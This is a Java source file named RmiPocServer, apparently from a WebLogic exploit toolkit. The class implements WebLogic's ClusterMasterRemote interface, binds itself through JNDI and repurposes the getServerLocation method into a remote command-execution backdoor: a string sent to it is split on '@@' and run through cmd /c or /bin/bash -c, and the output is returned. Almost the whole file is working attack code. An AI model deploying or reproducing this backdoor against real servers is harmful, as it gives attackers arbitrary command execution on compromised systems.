import weblogic.cluster.singleton.ClusterMasterRemote;
import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.rmi.RemoteException;

/**
 * Title: RmiPocServer
 * Desc: RmiPocServer
 * Date:2020/3/22 0:36
 * Email:woo0nise@gmail.com
 * Company:www.r4v3zn.com
 * @author R4v3zn
 * @version 1.0.0
 */
public class RmiPocServer implements ClusterMasterRemote {

    /**
     * rmi bind
     * @param clientName bind 名称
     * @throws RemoteException
     */
    public void rmiBind(String clientName) {
        try {
            RmiPocServer rmiServer = new RmiPocServer();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void setServerLocation(String s, String s1) throws RemoteException {

    }

    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        String[] splitArr = cmd.split("@@");
        cmd = splitArr[0];
        String os = splitArr[1];
        os = os.trim().toLowerCase();
        return execCmd(cmd, os);
    }

    /**
     * 执行命令
     * @param cmd 执行命令
     * @param clientOs 客户端操作系统
     * @return 执行结果
     * @throws RemoteException
     */
    public String execCmd(String cmd, String clientOs) throws RemoteException {
        if(cmd == null || "".equals(cmd)){
            return "commond not null";
        }
        cmd = cmd.trim();
        StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        String os = System.getProperty("os.name");
        os = os.toLowerCase();
        String[] executeCmd = null;
        if(os.contains("win")){
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -n 4";
            }
            executeCmd = new String[]{"cmd", "/c", cmd};
        }else{
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -t 4";
            }
            executeCmd = new String[]{"/bin/bash", "-c", cmd};
        }
        try {
            process = Runtime.getRuntime().exec(executeCmd);
            process.waitFor();
            if (clientOs.contains("windows")){
                bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
            }else{
                bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
                bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
            }
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        } catch (InterruptedException e) {
        } catch (UnsupportedEncodingException e) {
        } catch (IOException e) {
            return cmd+" execute error,msg: not found commond";
        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        if(result == null || "".equals(result)){
            return cmd+" execute ok!";
        }else{
            return result.toString();
        }
    }

    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // TODO:
            }
        }
    }
}
